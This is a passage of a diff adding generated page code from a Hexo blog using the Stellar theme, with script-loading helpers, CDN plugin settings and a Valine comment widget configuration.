+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
